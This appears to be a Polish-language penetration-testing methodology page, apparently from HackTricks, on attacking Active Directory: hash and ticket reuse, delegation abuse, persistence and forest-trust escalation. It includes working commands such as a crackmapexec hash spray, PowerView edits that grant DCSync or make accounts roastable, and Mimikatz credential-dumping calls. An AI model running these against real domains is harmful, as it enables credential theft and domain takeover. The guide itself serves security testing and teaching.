Miejmy nadzieję, że udało Ci się **przejąć** jakieś konto **lokalnego administratora** za pomocą [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), w tym relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) oraz [lokalnej eskalacji uprawnień](../windows-local-privilege-escalation/index.html).\
Następnie nadszedł czas, aby zrzucić wszystkie hashe znajdujące się w pamięci i lokalnie.\
[**Przeczytaj tę stronę, aby poznać różne sposoby uzyskiwania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz hash użytkownika**, możesz użyć go do **podszycia się** pod niego.\
Musisz użyć **narzędzia**, które **wykona** **uwierzytelnienie NTLM przy użyciu** tego **hasha**, **albo** możesz utworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, aby podczas dowolnego **uwierzytelnienia NTLM** został użyty właśnie ten **hash**. Ostatnia opcja jest stosowana przez mimikatz.\
[**Przeczytaj tę stronę, aby uzyskać więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **wykorzystanie hasha NTLM użytkownika do żądania biletów Kerberos**, jako alternatywy dla powszechnie stosowanego Pass The Hash w protokole NTLM. Może to być szczególnie **przydatne w sieciach, w których protokół NTLM jest wyłączony** i jako protokół uwierzytelniania dozwolony jest wyłącznie **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną bilet uwierzytelniający użytkownika**, zamiast jego hasła lub wartości hash. Następnie skradziony bilet jest używany do **podszycia się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie poświadczeń

Jeśli masz **hash** lub **hasło** **lokalnego administratora**, powinieneś spróbować **zalogować się lokalnie** na innych **komputerach** przy jego użyciu.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Należy pamiętać, że jest to dość **głośne**, a **LAPS** mogłoby temu **zapobiec**.

### MSSQL Abuse & Trusted Links

Jeśli użytkownik ma uprawnienia do **uzyskiwania dostępu do instancji MSSQL**, może być w stanie użyć ich do **wykonywania poleceń** na hoście MSSQL (jeśli działa jako SA), **wykradania** **hasha** NetNTLM lub nawet przeprowadzenia **ataku** typu **relay**.\
Jeśli instancja MSSQL jest zaufana za pośrednictwem łącza baz danych przez inną instancję, użytkownik posiadający uprawnienia do połączonej bazy danych może być w stanie **wykorzystać relację zaufania do wykonywania zapytań w innej instancji**. Takie relacje zaufania można łączyć, co może ostatecznie doprowadzić do źle skonfigurowanej bazy danych, w której użytkownik będzie mógł wykonywać polecenia.\
**Łącza między bazami danych działają nawet w przypadku trustów między forestami.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Rozwiązania firm trzecich do inwentaryzacji i wdrażania często udostępniają potężne ścieżki prowadzące do danych uwierzytelniających i wykonywania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić z pamięci TGT wszystkich użytkowników logujących się na tym komputerze.\
Jeśli więc **Domain Admin zaloguje się na komputerze**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego za pomocą [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma włączoną funkcję "Constrained Delegation", będzie mógł **podszyć się pod dowolnego użytkownika w celu uzyskania dostępu do niektórych usług na komputerze**.\
Następnie, jeśli **przejmiesz hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (w tym domain adminów), aby uzyskać dostęp do niektórych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie wykonywania kodu z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Przejęty użytkownik może mieć **interesujące uprawnienia do niektórych obiektów domeny**, które mogą pozwolić na późniejsze **przemieszczanie się** między systemami/**eskalację** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Wykrycie **nasłuchującej** usługi **Spool** w domenie może zostać **wykorzystane** do **pozyskania nowych danych uwierzytelniających** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Jeśli **inni użytkownicy** **uzyskują dostęp** do **przejętej** maszyny, możliwe jest **pozyskanie danych uwierzytelniających z pamięci**, a nawet **wstrzyknięcie beaconów do ich procesów**, aby się pod nich podszyć.\
Zwykle użytkownicy uzyskują dostęp do systemu przez RDP, więc tutaj znajdziesz informacje o przeprowadzaniu kilku ataków na sesje RDP użytkowników trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach przyłączonych do domeny, gwarantując, że jest ono **losowe**, unikalne i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą ACL i ograniczony wyłącznie do autoryzowanych użytkowników. Przy wystarczających uprawnieniach do uzyskania dostępu do tych haseł możliwe staje się pivotowanie do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Pozyskanie certyfikatów** z przejętej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Jeśli skonfigurowane są **podatne szablony**, możliwe jest ich wykorzystanie do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Po uzyskaniu uprawnień **Domain Admin** lub, jeszcze lepiej, **Enterprise Admin**, możesz **zrzucić** **bazę danych domeny**: _ntds.dit_.

[**Więcej informacji o ataku DCSync można znaleźć tutaj**](dcsync.md).

[**Więcej informacji o tym, jak wykraść NTDS.dit, można znaleźć tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Niektóre z omówionych wcześniej technik mogą zostać wykorzystane do persistence.\
Możesz na przykład:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Nadać użytkownikowi uprawnienia [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Atak Silver Ticket** tworzy **legitymny bilet Ticket Granting Service (TGS)** dla określonej usługi, wykorzystując **hash NTLM** (na przykład **hash konta komputera**). Metoda ta służy do **uzyskania dostępu do uprawnień usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Atak Golden Ticket** polega na uzyskaniu przez atakującego dostępu do **hasha NTLM konta krbtgt** w środowisku Active Directory (AD). Konto to jest wyjątkowe, ponieważ służy do podpisywania wszystkich **biletów Ticket Granting (TGT)**, które są niezbędne do uwierzytelniania w sieci AD.

Po uzyskaniu tego hasha atakujący może tworzyć **TGT** dla dowolnie wybranego konta (atak Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są one podobne do golden tickets, ale sfałszowane w sposób, który **omija typowe mechanizmy wykrywania golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Posiadanie certyfikatów konta lub możliwość ich żądania** to bardzo dobry sposób na utrzymanie persistence na koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Wykorzystanie certyfikatów umożliwia również utrzymanie persistence z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins), stosując standardową **Access Control List (ACL)** do tych grup w celu zapobiegania nieautoryzowanym zmianom. Funkcja ta może jednak zostać wykorzystana: jeśli atakujący zmodyfikuje ACL obiektu AdminSDHolder, aby nadać pełny dostęp zwykłemu użytkownikowi, użytkownik ten uzyska szeroką kontrolę nad wszystkimi uprzywilejowanymi grupami. Mechanizm bezpieczeństwa, który ma zapewniać ochronę, może więc przynieść odwrotny skutek i umożliwić nieuprawniony dostęp, jeśli nie jest dokładnie monitorowany.

[**Więcej informacji o grupie AdminDSHolder można znaleźć tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

W każdym **Domain Controller (DC)** istnieje konto **lokalnego administratora**. Po uzyskaniu praw administratora na takiej maszynie hash lokalnego Administratora można wyodrębnić za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **włączyć używanie tego hasła**, co umożliwi zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Możesz **nadać** **użytkownikowi** pewne **specjalne uprawnienia** do określonych obiektów domeny, które pozwolą mu **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, jakie **obiekt** posiada **do** innego **obiektu**. Jeśli możesz dokonać nawet **niewielkiej zmiany** w **deskryptorze zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności przynależności do uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Wykorzystaj pomocniczą klasę `dynamicObject` do tworzenia krótkotrwałych principalów/GPO/rekordów DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się one automatycznie bez tworzenia tombstones, zacierając dowody LDAP, a jednocześnie pozostawiając osierocone SID-y, uszkodzone odwołania `gPLink` lub buforowane odpowiedzi DNS (np. zanieczyszczenie ACE obiektu AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/zintegrowanego z AD DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **uniwersalne hasło**, zapewniając dostęp do wszystkich kont domeny.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać** w **postaci jawnego tekstu** **dane uwierzytelniające** używane do uzyskiwania dostępu do maszyny.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPN-y...) do określonych obiektów, **nie pozostawiając żadnych logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz znajdować się w **domenie głównej**.\
Pamiętaj, że jeśli użyjesz nieprawidłowych danych, pojawią się bardzo niekorzystne logi.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omówiliśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Hasła te mogą jednak również służyć do **utrzymania persistence**.\
Zobacz:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft traktuje **Forest** jako granicę bezpieczeństwa. Oznacza to, że **przejęcie pojedynczej domeny może potencjalnie doprowadzić do przejęcia całego Forest**.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa umożliwiający użytkownikowi z jednej **domeny** uzyskanie dostępu do zasobów w innej **domenie**. Tworzy on połączenie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelniania. Po ustanowieniu trustu domeny wymieniają i przechowują określone **klucze** w swoich **Domain Controllerach (DC)**, które mają kluczowe znaczenie dla integralności trustu.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **zaufanej domenie**, musi najpierw zażądać specjalnego biletu, znanego jako **inter-realm TGT**, od kontrolera domeny własnej domeny. TGT ten jest szyfrowany za pomocą współdzielonego **klucza**, uzgodnionego przez obie domeny. Następnie użytkownik przedstawia ten TGT **DC zaufanej domeny**, aby otrzymać bilet usługi (**TGS**). Po pomyślnej walidacji inter-realm TGT przez DC zaufanej domeny wystawia on TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. **Komputer kliencki** w **Domenie 1** rozpoczyna proces, używając swojego **hasha NTLM** do żądania **biletu Ticket Granting (TGT)** od swojego **Domain Controllera (DC1)**.
2. DC1 wystawia nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Następnie klient żąda od DC1 **inter-realm TGT**, który jest potrzebny do uzyskania dostępu do zasobów w **Domenie 2**.
4. Inter-realm TGT jest szyfrowany za pomocą **klucza trustu**, współdzielonego przez DC1 i DC2 w ramach dwukierunkowego trustu domen.
5. Klient przekazuje inter-realm TGT do **Domain Controllera Domeny 2 (DC2)**.
6. DC2 weryfikuje inter-realm TGT za pomocą współdzielonego klucza trustu i, jeśli jest prawidłowy, wystawia **bilet Ticket Granting Service (TGS)** dla serwera w Domenie 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi. TGS jest szyfrowany hashem konta serwera i umożliwia uzyskanie dostępu do usługi w Domenie 2.

### Different trusts

Należy pamiętać, że **trust może być jednokierunkowy lub dwukierunkowy**. W przypadku opcji dwukierunkowej obie domeny ufają sobie nawzajem, natomiast w relacji **jednokierunkowego** trustu jedna z domen będzie domeną **zaufaną**, a druga domeną **ufającą**. W tym drugim przypadku **będziesz mieć dostęp do zasobów domeny ufającej wyłącznie z domeny zaufanej**.

Jeśli Domena A ufa Domenie B, A jest domeną ufającą, a B domeną zaufaną. Ponadto w **Domenie A** będzie to **Outbound trust**, a w **Domenie B** będzie to **Inbound trust**.

**Różne relacje zaufania**

- **Parent-Child Trusts**: Jest to typowa konfiguracja w obrębie tego samego forestu, w której domena podrzędna automatycznie posiada dwukierunkowy, przechodni trust ze swoją domeną nadrzędną. Oznacza to, że żądania uwierzytelniania mogą płynnie przepływać między domeną nadrzędną i podrzędną.
- **Cross-link Trusts**: Określane jako "shortcut trusts", są ustanawiane między domenami podrzędnymi w celu przyspieszenia procesów odwołań. W złożonych forestach odwołania uwierzytelniania zwykle muszą przejść do korzenia forestu, a następnie zejść do domeny docelowej. Tworzenie cross-linków skraca tę drogę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Są ustanawiane między różnymi, niezależnymi domenami i z natury są nieprzechodnie. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) external trusts są przydatne do uzyskiwania dostępu do zasobów w domenie znajdującej się poza bieżącym forestem, która nie jest połączona forest trustem. Bezpieczeństwo zwiększa się dzięki filtrowaniu SID w external trusts.
- **Tree-root Trusts**: Trusty te są automatycznie ustanawiane między domeną główną forestu a nowo dodanym korzeniem drzewa. Chociaż nie spotyka się ich często, tree-root trusts są ważne przy dodawaniu nowych drzew domen do forestu, ponieważ umożliwiają im zachowanie unikalnej nazwy domeny i zapewniają dwukierunkową przechodniość. Więcej informacji można znaleźć w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trustu jest dwukierunkowym, przechodnim trustem między dwiema domenami głównymi forestów i również wymusza filtrowanie SID w celu zwiększenia bezpieczeństwa.
- **MIT Trusts**: Trusty te są ustanawiane z nie-windowsowymi domenami Kerberos zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts są nieco bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach zaufania**

- Relacja zaufania może być również **przechodnia** (A ufa B, B ufa C, więc A ufa C) lub **nieprzechodnia**.
- Relacja zaufania może być skonfigurowana jako **zaufanie dwukierunkowe** (obie strony ufają sobie nawzajem) lub jako **zaufanie jednokierunkowe** (tylko jedna strona ufa drugiej).

### Attack Path

1. **Wylicz** relacje zaufania.
2. Sprawdź, czy którykolwiek **principal bezpieczeństwa** (użytkownik/grupa/komputer) ma **dostęp** do zasobów **innej domeny**, na przykład za pośrednictwem wpisów ACE lub członkostwa w grupach innej domeny. Poszukaj **relacji między domenami** (prawdopodobnie właśnie w tym celu utworzono trust).
1. Kerberoast w tym przypadku może być kolejną opcją.
3. **Przejmij** **konta**, które mogą wykonywać pivotowanie między domenami.

Atakujący mogą uzyskać dostęp do zasobów w innej domenie za pomocą trzech podstawowych mechanizmów:

- **Local Group Membership**: Principale mogą zostać dodane do grup lokalnych na komputerach, takich jak grupa “Administrators” na serwerze, zapewniając im znaczną kontrolę nad tym komputerem.
- **Foreign Domain Group Membership**: Principale mogą również należeć do grup w obcej domenie. Skuteczność tej metody zależy jednak od charakteru trustu i zakresu grupy.
- **Access Control Lists (ACLs)**: Principale mogą być określone w **ACL**, w szczególności jako encje w **ACE** należących do **DACL**, zapewniając im dostęp do określonych zasobów. Osobom chcącym lepiej zrozumieć mechanizmy ACL, DACL i ACE szczególnie przydatny będzie whitepaper zatytułowany “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)”.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **zewnętrznej domeny/forestu**.

Możesz sprawdzić to w **Bloodhound** lub za pomocą powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Eskalacja uprawnień w lesie z podrzędnego do nadrzędnego
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumeracji relacji zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Możesz uzyskać ten używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaluj do poziomu Enterprise admin w domenie child/parent, wykorzystując trust za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit zapisywalnego Configuration NC

Zrozumienie sposobu wykorzystania Configuration Naming Context (NC) ma kluczowe znaczenie. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, przy czym zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, należy posiadać **uprawnienia SYSTEM na DC**, najlepiej na child DC.

**Powiązanie GPO z lokacją root DC**

Kontener Sites Configuration NC zawiera informacje o lokacjach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą powiązać GPO z lokacjami root DC. Działanie to może doprowadzić do przejęcia root domain poprzez manipulowanie zasadami stosowanymi do tych lokacji.

Szczegółowe informacje można znaleźć w badaniach dotyczących [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Przejęcie dowolnego gMSA w lesie**

Jeden z wektorów ataku polega na zaatakowaniu uprzywilejowanych gMSA w domenie. Klucz KDS Root, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Dzięki uprawnieniom SYSTEM na dowolnym DC można uzyskać dostęp do klucza KDS Root i obliczyć hasła dowolnego gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć tutaj:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak delegated MSA (BadSuccessor – wykorzystanie migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe badania zewnętrzne: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Schema change attack**

Ta metoda wymaga cierpliwości i oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Dzięki uprawnieniom SYSTEM atakujący może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu do nowo utworzonych obiektów AD i przejęcia nad nimi kontroli.

Dalsze informacje można znaleźć w [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Podatność ADCS ESC5 dotyczy kontroli nad obiektami Public Key Infrastructure (PKI), umożliwiającej utworzenie certificate template pozwalającego na uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, przejęcie zapisywalnego child DC umożliwia przeprowadzenie ataków ESC5.

Więcej szczegółów można znaleźć w [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> W scenariuszach, w których brakuje ADCS, atakujący może skonfigurować niezbędne komponenty, jak omówiono w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Zewnętrzna domena forest - One-Way (Inbound) lub bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **Twoja domena jest zaufana** przez domenę zewnętrzną, która nadaje Ci **nieokreślone uprawnienia** w jej obrębie. Musisz znaleźć, **które podmioty z Twojej domeny mają jaki dostęp do domeny zewnętrznej**, a następnie spróbować go wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu — jednokierunkowa (wychodząca)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** **ufa** pewnym **uprawnieniom** podmiotu z **innej domeny**.

Jednak gdy **domena jest obdarzona zaufaniem** przez domenę ufającą, zaufana domena **tworzy użytkownika** o **przewidywalnej nazwie**, używając jako **hasła hasła zaufanej domeny**. Oznacza to, że możliwe jest **uzyskanie dostępu do użytkownika z domeny ufającej, aby przedostać się do zaufanej domeny**, przeprowadzić jej enumerację i spróbować dalej eskalować uprawnienia:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na skompromitowanie zaufanej domeny jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** do zaufania domenowego (co nie jest zbyt częste).

Innym sposobem na skompromitowanie zaufanej domeny jest oczekiwanie na maszynie, do której **użytkownik z zaufanej domeny może uzyskać dostęp**, aby zalogował się przez **RDP**. Następnie atakujący może wstrzyknąć kod do procesu sesji RDP i **uzyskać dostęp do domeny źródłowej ofiary**.\
Co więcej, jeśli **ofiara zamontowała swój dysk twardy**, atakujący może, korzystając z procesu **sesji RDP**, umieścić **backdoory** w **folderze startowym dysku twardego**. Ta technika nosi nazwę **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Ograniczanie nadużywania zaufania domenowego

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history przez zaufania między lasami jest ograniczane przez SID Filtering, który jest domyślnie aktywowany dla wszystkich zaufania między lasami. Opiera się to na założeniu, że zaufania wewnątrz lasu są bezpieczne, ponieważ zgodnie ze stanowiskiem Microsoftu granicą bezpieczeństwa jest las, a nie domena.
- Istnieje jednak pewien problem: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączania.

### **Selective Authentication:**

- W przypadku zaufania między lasami zastosowanie Selective Authentication gwarantuje, że użytkownicy z obu lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskiwać dostęp do domen i serwerów w zaufanej domenie lub lesie.
- Należy pamiętać, że środki te nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Nadużywanie AD oparte na LDAP z implantów działających na hoście

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operatorzy kompilują pakiet za pomocą `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z beacona. Cały ruch korzysta z bieżącego kontekstu bezpieczeństwa logowania przez LDAP (389) z podpisywaniem/szyfrowaniem lub LDAPS (636) z automatycznym zaufaniem certyfikatów, więc nie są wymagane proxy socks ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym deskryptory bezpieczeństwa), a także metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` ujawniają kandydatów do roasting, ustawienia delegowania oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) bezpośrednio z LDAP.
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić powierników, uprawnienia (GenericAll/WriteDACL/WriteOwner/zapisy atrybutów) oraz dziedziczenie, zapewniając natychmiastowe cele do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitives LDAP do eskalacji i persistence

- BOF-y tworzące obiekty (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe principals lub konta komputerów wszędzie tam, gdzie istnieją uprawnienia do OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` umożliwiają bezpośrednie przejęcie celów po znalezieniu praw do zapisu właściwości.
- Polecenia skoncentrowane na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekształcają WriteDACL/WriteOwner na dowolnym obiekcie AD w resetowanie haseł, kontrolę członkostwa w grupach lub uprawnienia replikacji DCSync bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegation, roasting i nadużycia Kerberos

